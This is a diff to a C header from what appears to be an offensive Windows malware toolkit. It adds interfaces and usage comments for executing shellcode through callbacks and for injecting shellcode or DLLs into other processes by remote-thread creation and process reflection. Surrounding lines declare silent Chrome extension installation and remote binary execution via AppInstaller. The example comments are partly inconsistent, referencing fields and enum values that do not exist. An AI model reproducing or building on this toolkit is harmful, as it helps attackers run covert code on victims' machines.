@@ -39,20 +39,25 @@
 #define InlineGetCurrentProcess (HANDLE)((HANDLE)-1)
 
 
+/*******************************************
+ SHELLCODE VIA CALLBACK ROUTINE INFORMATION
+*******************************************/
+
 /*
 
-    LPBYTE Payload is a pointer to shellcode
-    DWORD dwLengthOfPayloadInBytes is the length of the payload in bytes
+    LPBYTE Payload
+        a pointer to shellcode
+    DWORD dwLengthOfPayloadInBytes
+        the length of the payload in bytes
+    Enum SHELLCODE_EXECUTION_METHOD
+        specifies shellcode execution method
+        
 
     example:
-
     SHELLCODE_EXECUTION_INFORMATION Sei = { 0 };
-    Sei.Payload = Shellcode;
-    Sei.dwLengthOfPayloadInBytes = 280 //whatever the length is
-
-    MethodEnum flag must be one of the values in the SHELLCODE_EXECUTION_METHOD enum
-    each enum indicates which win32 function to use for shellcode execution
-
+    Sei.Payload = Shellcode; //pointer to shellcode
+    Sei.dwLengthOfPayloadInBytes = 280; //whatever the length is
+    Sei.Method = E_CERTENUMSYSTEMSTORE; //method from SHELLCODE_EXECUTION_METHOD
 */
 
 typedef enum SHELLCODE_EXECUTION_METHOD {
@@ -123,6 +128,52 @@ typedef struct DESCRIPTOR_ENTRY {
 inline CRITICAL_SECTION CriticalSection = { 0 };
 inline DESCRIPTOR_ENTRY* Head = NULL;
 inline HARDWARE_ENGINE_INIT_SETTINGS_GLOBAL GlobalHardwareBreakpointObject;
+
+/*******************************************
+ PROCESS INJECTION INFORMATION
+*******************************************/
+
+/*
+
+    LPBYTE Payload
+        a pointer to shellcode
+    DWORD dwLengthOfPayloadInBytes
+        the length of the payload in bytes
+    Enum PROCESS_INJECTION_METHOD
+        specifies process injection method
+    DWORD TargetPid
+        specify target process
+    [OPTIONAL] DWORD ThreadId 
+        specify target process thread id (depends PROCESS_INJECTION_METHOD)
+    [OPTIONAL] TCHAR PathToFile //depends on if youre using W or A suffix
+        path to DLL to load (depends PROCESS_INJECTION_METHOD)
+        
+
+    example:
+    PROCESS_INJECTION_INFORMATION Pii = { 0 };
+    Sei.Payload = Shellcode; //pointer to shellcode
+    Pii.dwLengthOfPayloadInBytes = 280; //whatever the length is
+    Pii.Method = E_PROCESSREFLECTION; //method from PROCESS_INJECTION_METHOD
+    Pii.ProcessId = 100; //whatever the process id is, this is just a random number lol
+    Pii.ThreadId = 0; //not required for this method
+    Pii.PathToFile = DllPath; pointer to path of dll you want loaded, only WCHAR supported
+
+*/
+
+typedef enum PROCESS_INJECTION_METHOD {
+    E_WRITEPROCESSMEMORY_CREATEREMOTETHREAD_EXECUTESHELLCODE, //0
+    E_PROCESS_REFLECTION_EXECUTESHELLCODE, //1 UNIMPLEMENTED
+    E_CTRL_INJECT //2
+}PROCESS_INJECTION_METHOD, * PPROCESS_INJECTION_METHOD;
+
+typedef struct __PROCESS_INJECTION_INFORMATION {
+    LPBYTE Payload;
+    DWORD dwLengthOfPayloadInBytes;
+    DWORD MethodEnum;
+    DWORD ProcessId;
+    DWORD ThreadId;
+    PWCHAR PathToFile;
+}PROCESS_INJECTION_INFORMATION, *PPROCESS_INJECTION_INFORMATION;
 
 
 
@@ -309,6 +360,9 @@ BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginW(_In_ PWCHAR Extens
 BOOL __unstable__preview__MpfSilentInstallGoogleChromePluginA(_In_ PCHAR ExtensionIdentifier);
 BOOL MpfLolExecuteRemoteBinaryByAppInstallerW(_In_ PWCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes);
 BOOL MpfLolExecuteRemoteBinaryByAppInstallerA(_In_ PCHAR RemoteUrlTextFile, _In_ DWORD RemoteUrlLengthInBytes);
+DWORD ProcessInjectionMain(_In_ PPROCESS_INJECTION_INFORMATION Pii);
+BOOL MpfProcessInjectionViaProcessReflection(_In_ PBYTE Shellcode, _In_ DWORD dwSizeOfShellcodeInBytes, _In_ DWORD TargetPid);
+BOOL MpfProcessInjectionViaCreateRemoteThread(_In_ PBYTE Shellcode, _In_ DWORD dwSizeOfShellcodeInBytes, _In_ DWORD TargetPid);
 
 
 
